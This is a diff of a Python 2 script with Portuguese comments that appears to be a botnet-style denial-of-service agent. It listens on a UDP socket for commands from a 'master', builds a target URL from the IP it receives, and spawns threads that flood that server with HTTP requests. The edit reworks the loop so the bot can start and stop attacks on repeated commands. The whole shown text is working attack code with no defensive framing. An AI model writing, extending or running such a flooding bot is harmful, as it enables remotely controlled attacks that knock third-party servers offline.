@@ -19,23 +19,6 @@ def Post(url,attackedServerPort):
         r = requests.get(url,data = parameters, headers=headers)
         print r.text
 
-#Funcao que controlara o attack
-def Is_attack(msg):
-
-    #Ira analisar a variavel global
-    global Kill
-
-    #Se receber a mensagem S de start 
-    if (msg == 'S'):
-        print 'Starting attack'
-        #Nao mata as threads e continua o ataque
-        Kill = False
-    #Se receber a mensagem B de BREAK    
-    elif (msg == 'B'):
-        #Mata as threads e para o ataque
-        print 'Attack over'
-        Kill = True
-
 #Funcao que ira criar as Threas 
 def attack(IP, attackedServerPort):
 
@@ -80,23 +63,29 @@ def listening():
 
     print 'Waiting for my master...'
 
-    while not sentence:
-        sentence, addr = serverSocket.recvfrom(1024)
-
-
-    command = sentence.split('/')[0]
-    IP = sentence.split('/')[1]
-
-    IP = 'http://' + IP + ':' + str(attackedServerPort)
-
-    attackThread = Thread(target=attack, args=[IP, attackedServerPort])
-    attackThread.setDaemon(True) # vai setar a thread como daemon, o que vai possibilitar o fechamento delas
-    attackThread.start()
+    #Ira analisar a variavel global
+    global Kill
 
     while 1:
-        sentence, addr = serverSocket.recvfrom(1024)
+        while not sentence:
+            sentence, addr = serverSocket.recvfrom(1024)
+
         command = sentence.split('/')[0]
-        Is_attack(command)
+        IP = sentence.split('/')[1]
+
+        IP = 'http://' + IP + ':' + str(attackedServerPort)
+
+        attackThread = Thread(target=attack, args=[IP, attackedServerPort])
+        attackThread.setDaemon(True) # vai setar a thread como daemon, o que vai possibilitar o fechamento delas
+        sentence = ''
+        if(command == 'S'):
+            print 'Starting attack'
+            Kill = False
+            attackThread.start()
+        else:
+            print 'Attack is over'
+            Kill = True
+        
 
     #Fecha socket    
     serverSocket.close()
